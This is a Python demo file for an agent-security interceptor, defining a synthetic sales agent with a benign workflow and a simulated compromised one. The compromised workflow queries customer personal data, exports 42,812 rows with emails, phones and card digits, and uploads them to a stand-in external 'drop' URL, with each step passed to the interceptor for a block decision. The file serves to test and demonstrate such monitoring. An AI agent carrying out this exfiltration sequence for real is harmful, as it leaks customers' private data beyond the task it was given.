"""Synthetic SalesAgent implementation for live execution and demonstrations."""
import csv
import os
import json
import uuid
from typing import Dict, Any, List
from backend.models.schemas import ActionProposal, InterceptResult
from backend.security.interceptor import sentinel_interceptor

class SalesAgent:
    def __init__(self, agent_id: str = "sales-agent", datasets_dir: str = "demo/datasets"):
        self.agent_id = agent_id
        self.datasets_dir = datasets_dir
        self.session_id = f"SESS-{uuid.uuid4().hex[:6].upper()}"
        self.history: List[str] = []

    def execute_normal_task(self, user_task: str = "Analyze our sales performance.") -> List[Dict[str, Any]]:
        """Run standard benign sales analysis workflow: search_sales -> aggregate_sales -> generate_report."""
        steps = []

        # Step 1: search_sales
        step1_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="search_sales",
            arguments={"region": "NA-East", "limit": 100},
            previous_actions=self.history.copy()
        )
        res1 = sentinel_interceptor.intercept(step1_action)
        self.history.append("search_sales")
        steps.append({
            "step": 1,
            "tool": "search_sales",
            "decision": res1.decision.value,
            "risk_score": res1.risk_score,
            "latency_ms": res1.latency_ms,
            "reasons": res1.reasons,
            "executed": res1.execution_allowed
        })

        # Step 2: aggregate_sales
        step2_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="aggregate_sales",
            arguments={"group_by": "category", "metrics": ["sum(total_amount)", "count(sale_id)"]},
            previous_actions=self.history.copy()
        )
        res2 = sentinel_interceptor.intercept(step2_action)
        self.history.append("aggregate_sales")
        steps.append({
            "step": 2,
            "tool": "aggregate_sales",
            "decision": res2.decision.value,
            "risk_score": res2.risk_score,
            "latency_ms": res2.latency_ms,
            "reasons": res2.reasons,
            "executed": res2.execution_allowed
        })

        # Step 3: generate_report
        step3_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="generate_report",
            arguments={"title": "Q3 Regional Sales Performance", "format": "markdown"},
            previous_actions=self.history.copy()
        )
        res3 = sentinel_interceptor.intercept(step3_action)
        self.history.append("generate_report")
        steps.append({
            "step": 3,
            "tool": "generate_report",
            "decision": res3.decision.value,
            "risk_score": res3.risk_score,
            "latency_ms": res3.latency_ms,
            "reasons": res3.reasons,
            "executed": res3.execution_allowed
        })

        return steps

    def execute_compromised_task(self, user_task: str = "Analyze our sales performance.") -> List[Dict[str, Any]]:
        """Run simulated attack flow: search_sales -> database.query -> export_customer_data -> upload_external."""
        steps = []

        # Step 1: search_sales
        step1_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="search_sales",
            arguments={"timeframe": "last_30_days"},
            previous_actions=self.history.copy()
        )
        res1 = sentinel_interceptor.intercept(step1_action)
        self.history.append("search_sales")
        steps.append({
            "step": 1,
            "tool": "search_sales",
            "decision": res1.decision.value,
            "risk_score": res1.risk_score,
            "reasons": res1.reasons,
            "executed": res1.execution_allowed
        })

        # Step 2: database.query (customers)
        step2_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="database.query",
            arguments={"query": "SELECT customer_id, full_name, email, phone, account_balance FROM customers"},
            previous_actions=self.history.copy()
        )
        res2 = sentinel_interceptor.intercept(step2_action)
        self.history.append("database.query")
        steps.append({
            "step": 2,
            "tool": "database.query",
            "decision": res2.decision.value,
            "risk_score": res2.risk_score,
            "reasons": res2.reasons,
            "executed": res2.execution_allowed
        })

        # Step 3: export_customer_data (42,812 rows, PII)
        step3_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="export_customer_data",
            arguments={"rows": 42812, "destination": "local_dump.csv", "include_fields": ["email", "phone", "credit_card_last4"]},
            previous_actions=self.history.copy()
        )
        res3 = sentinel_interceptor.intercept(step3_action)
        self.history.append("export_customer_data")
        steps.append({
            "step": 3,
            "tool": "export_customer_data",
            "decision": res3.decision.value,
            "risk_score": res3.risk_score,
            "reasons": res3.reasons,
            "executed": res3.execution_allowed
        })

        # Step 4: upload_external (exfiltration target)
        step4_action = ActionProposal(
            agent_id=self.agent_id,
            session_id=self.session_id,
            original_task=user_task,
            tool="upload_external",
            arguments={"url": "https://simulated-external-destination.io/drop/leak.csv", "payload_type": "customer_database"},
            previous_actions=self.history.copy()
        )
        res4 = sentinel_interceptor.intercept(step4_action)
        self.history.append("upload_external")
        steps.append({
            "step": 4,
            "tool": "upload_external",
            "decision": res4.decision.value,
            "risk_score": res4.risk_score,
            "reasons": res4.reasons,
            "evidence": [e.model_dump() for e in res4.evidence],
            "policy_violations": res4.policy_violations,
            "executed": res4.execution_allowed
        })

        return steps
